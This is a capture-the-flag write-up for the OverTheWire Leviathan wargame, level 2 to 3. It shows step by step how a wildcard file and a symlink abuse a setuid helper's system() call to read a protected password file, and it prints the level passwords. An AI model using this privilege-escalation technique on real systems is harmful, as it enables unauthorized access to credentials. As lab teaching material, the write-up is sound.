# Leviathan Level 02 to 03

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Leviathan |
| Level | 2 -> 3 |
| Status | Complete |

## Objective

Recover the password for `leviathan3` from the setuid file-printing helper.

## Given Access

User: `leviathan2`

Password:

```text
NsN1HwFoyN
```

## Recon

The account contains a setuid helper named `printfile`. `strings` reveals it checks `access(filename, R_OK)` and then calls `system("/bin/cat %s")`.

## Method

Direct command injection is blocked by the `access()` check, but shell globbing still happens later inside `system()`. Create:

- a readable file literally named `*` so the access check passes
- a symlink named `leak` pointing at `/etc/leviathan_pass/leviathan3`

Because the setuid helper switches to `leviathan3` before executing `/bin/cat *`, the shell expands `*` to both local entries and `cat` prints the target password through the symlink.

A temporary directory created by `mktemp -d` defaults to mode `700`, so it must be loosened to `755` first; otherwise the setuid user cannot traverse it.

## Commands

```bash
ssh -p 2223 leviathan2@leviathan.labs.overthewire.org
strings -a printfile
tmp=$(mktemp -d)
chmod 755 "$tmp"
cd "$tmp"
touch '*'
chmod 644 '*'
ln -s /etc/leviathan_pass/leviathan3 leak
~/printfile '*'
```

## Result

Password for `leviathan3`:

```text
f0n8h2iWLP
```

## Lesson

Even when input is checked with `access()`, handing that input to `system()` reintroduces shell expansion hazards. Wildcards and symlinks can be enough to pivot into privileged file reads.

## References

- https://overthewire.org/wargames/leviathan/
